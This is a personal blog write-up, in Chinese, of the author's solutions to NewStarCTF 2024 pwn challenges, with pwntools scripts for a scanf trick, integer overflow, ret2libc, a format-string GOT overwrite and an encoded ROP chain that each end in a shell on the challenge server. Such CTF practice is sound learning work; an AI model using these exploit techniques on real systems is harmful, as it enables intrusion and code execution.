---
title: newstarctf2024 pwn个人复现
date: 2024-11-10 21:00:00 +0800
categories: [Blog, pwn]
tags: [pwn]
---
# newstarctf 2024 pwn个人复现
从8月15日开始学习pwn有一段时间，最近似乎又陷入了瓶颈期，经过一段时间的反思，到底还是懒于思考，懒于实践。故鞭策自己，望勤动手，勤复现。
为了能够充分利用有限的时间，在此只记录我认为值得记录的部分。
## week1
都还算比较基础的内容
### game
自己的解法，即按照题目的思路来输入数字即可
```python
from pwn import *

io = remote("39.106.48.123", 31448)
index=0
while(index<=999):
    io.recvuntil("num:")
    io.sendline(b"9")
    index += 9
    print(index)
io.interactive()
```
官方wp给出的另一种解法：利用`scanf`函数的`%d`格式解析特性。以下是原话：
scanf 在解析 %d 遇到非数字的时候，会停止解析，但不会抛出异常，会直接返回目前的结果。

比如下面这个语句：

```C
scanf("%d", &value);
```
假设 `value` 原本是 `10`，如果输入 `1a`，那么会解析到 `1` 的输入，而忽略后面的`a`，这时候 `value` 会被变成 `1`.

如果不输入数字，直接输入 `a`，这时候，`scanf` 什么数字也解析不到，也就无法对 `value` 做修改。是的，这时候 `value` 的值没有变！并且由于这个解析的异常，会导致输入缓冲区无法被刷新，也就是说下一次调用的时候，下一个 `scanf` 会从 `a` 开始解析。

这么一想，那么我只需要输入寥寥几个字符，比如： `10a`，第一次调用 `scanf` 会解析出 `10`，并且给结果加上 `10`. 后面每次循环，`scanf` 会从剩下的 `a` 的位置进行解析，但是由于不是数字会被忽略，所以这个多出来的 `a` 就一直在！并且 `value` 的值没有变，保留上一次的 `10`. 因此，`scanf` 永远无法跳过这个 `a` 字符，最终就导致一直加 `10`，直到结果大于 `999`

### gdb
这道题的逻辑是对输入后的内容进行验证和匹配，由于匹配的key是写死在程序里后经过加密函数加密的，因此直接gdb动调到匹配的那一步进行观察就可以了
```python
from pwn import *

context(arch='amd64', os='linux',log_level='debug')

io = remote("8.147.132.32", 18505)
#io = process('../newstarctf/gdb')
print(pidof(io))
payload = b"\x5d\x1d\x43\x55\x53\x45\x57\x45"
#0x4557455355431d5d
io.recvuntil("data")
io.send(payload)
io.interactive()
```
### overwrite
这道题的考点是通过整数溢出突破read读取从而可以覆盖到栈上的变量
```python
from pwn import *

io = remote("39.106.48.123", 33789)
payload = cyclic(0x80-0x50) + b"114515"
io.recvuntil("readin")
io.sendline(b"-1")
io.recvuntil("say")
io.sendline(payload)
io.interactive()
```
## week2
### ez_game
常规的ret2libc，需要注意栈对齐
```python
from pwn import *

context(arch='amd64', os='linux',log_level='debug')

io = remote("101.200.139.65", 30798)
print(pidof(io))
libc = ELF('../newstarctf/libc-2.31.so')
elf = ELF('../newstarctf/attachment')
main = elf.symbols['main']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi = 0x400783
ret = 0x400509

payload1 = cyclic(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
io.recvuntil(b"!")
io.sendline(payload1)
puts_addr = u64(io.recvuntil(b'Wel')[-10:-4].ljust(8, b'\x00'))
print(hex(puts_addr))

base_addr = puts_addr - libc.symbols['puts']
system_addr = base_addr + libc.symbols['system']
bin_sh = base_addr + next(libc.search(b'/bin/sh'))

payload2 = cyclic(0x50+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system_addr)
io.recvuntil(b"!")
io.sendline(payload2)
io.interactive()
```
注意到官方的exp中有写法：
```python
libc = elf.libc
```
不知道原理是什么🧐 但下次试一试😋
### EZ_fmt
这道题算是我第一次做fmt类型的题目，为了做这道题才开始翻wiki翻资料，才开始学习fmt。虽说题还算常规，但还是记录下来，也算是记录自己学习fmt的过程。有机会单开一篇讲一下fmt。
只允许读取`0x30`进行fmt，所以对于payload的构造要慎重
除此之外补充一点：如果读取的字节太少那就很难完成任意地址写，此时出题人往往希望你利用fmt进行泄露
```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

elf = ELF('./pwn')
libc = ELF('./libc.so.6')
io = remote("39.106.48.123",29840)
puts_got = elf.got['puts']
read_got = elf.got['read']
printf_got = elf.got['printf']
memset_got = elf.got['memset']

print(hex(printf_got))

print(p64(read_got))
payload1 = b'AAAAAAAA' + b'|%p|'*10
offset = 8
payload2 = b'%9$s' + b'\x00\x00\x00\x00' + p64(puts_got)  #注意地址被00截断 这里用。ljust补齐8字节也可以
io.recvuntil(b"data")

io.sendline(payload2)
puts_addr = u64(io.recvuntil(b'data')[-10:-4].ljust(8, b'\x00'))
print(hex(puts_addr))

base_addr = puts_addr - libc.symbols['puts']
system_addr = base_addr + libc.symbols['system']
print('system:',hex(system_addr))

data1 = system_addr & 0xFF
data2 = ((system_addr & 0xFFFFFF) >> 8) - data1
data1 = str(data1)
data2 = str(data2)

payload = b'%'+ data1.encode() + b'c%12' + b'$hhn'
payload += b'%'+ data2.encode() + b'c%13' + b'$hn'
payload = payload.ljust(0x20,b'A') + p64(printf_got) + p64(printf_got+1)
payload = payload.ljust(0x30,b'A')

print(pidof(io))
pause()
io.send(payload)
io.sendline(b"/bin/sh\x00")
io.interactive()
```
### Inversted world
这道题真是超超超有意思
只要善用gdb动调，理解程序在干什么就很好做了
_read函数实现与read方向相反的读写操作
```python
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

#io = process('./pwn')
io = remote('101.200.139.65',36871)
elf = ELF('./pwn')
backdoor = elf.sym['backdoor']
backdoor_2 = 0x40137C
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

payload = b'12345678' * (32) + bytes(reversed(p64(backdoor_2)))
io.recv()
io.sendline(payload)
io.interactive()
```
### My_GBC!!!!!
不知道为什么用自带的libc打不通...最后同时泄露write和read然后用libc数据库才打通
不过对于初出茅庐的我来说是第一次做到这种对内存编码的题，值得记录
加密部分我是直接丢给gpt写的，最多自己微调一下
```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux',log_level='debug')

elf = ELF("../newstarctf/My_GBC!!!!!")
io = remote("8.147.132.32", 16222)
#io = process('../newstarctf/My_GBC!!!!!')
libc = ELF("../newstarctf/libc.so.6")

main = elf.sym['main']
write_plt = elf.plt['write']
write_got = elf.got['write']
read_got = elf.got['read']
pop_rdi = 0x4013b3
pop_rsi_pop_r15 = 0x4013b1
ret = 0x40101a
#找不到pop_rdx但是write可以暂时不管

def right_rotate3(byte):
    # 右旋转3位
    return ((byte >> 3) & 0xFF) | ((byte << 5) & 0xFF)
def decrypt(encrypted_data, xor_byte):
    decrypted_data = bytearray(len(encrypted_data))

    for i in range(len(encrypted_data)):
        # 先右旋转3位
        rotated_byte = right_rotate3(encrypted_data[i])

        # 异或操作
        decrypted_data[i] = rotated_byte ^ xor_byte

    return bytes(decrypted_data)

key = 0x5A

print(pidof(io))
addr = b''
for i in range(0,8):
    io.recvuntil(b"thing")
    payload1 = cyclic(0x10 + 0x8) + p64(pop_rdi) + p64(1) + p64(pop_rsi_pop_r15) + p64(write_got+i) + p64(1) + p64(
        write_plt) + p64(main)
    print(payload1)
    payload1 = decrypt(payload1, key)
    print(payload1)
    io.sendline(payload1)
    single = io.recvuntil(b"It")[-3:-2]
    addr += single
write_addr = u64(addr)
addr = b''
for i in range(0,8):
    io.recvuntil(b"thing")
    payload1 = cyclic(0x10 + 0x8) + p64(pop_rdi) + p64(1) + p64(pop_rsi_pop_r15) + p64(read_got+i) + p64(1) + p64(
        write_plt) + p64(main)
    print(payload1)
    payload1 = decrypt(payload1, key)
    print(payload1)
    io.sendline(payload1)
    single = io.recvuntil(b"It")[-3:-2]
    addr += single
read_addr = u64(addr)
print(hex(write_addr))
print(hex(read_addr))

#base_addr = addr - libc.symbols['read']
#system = base_addr + libc.symbols['system']
#bin_sh = base_addr + next(libc.search(b'/bin/sh'))

libc = LibcSearcher('write',write_addr)
libc.add_condition('read',read_addr)
base_addr = read_addr - libc.dump('read')
system = base_addr + libc.dump('system')
bin_sh = base_addr + libc.dump('str_bin_sh')

print(hex(system))
print(hex(bin_sh))
io.recvuntil(b'thing')
payload2 = cyclic(0x10+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
print(payload2)
payload2 = decrypt(payload2, key)
print(pidof(io))
pause()
io.sendline(payload2)
io.interactive()
```
### Bad Asm
这道题不太会写，为什么呢？
因为我不太会手写shellcode😰只会用shellcraft😋
等我去学，学完回来写
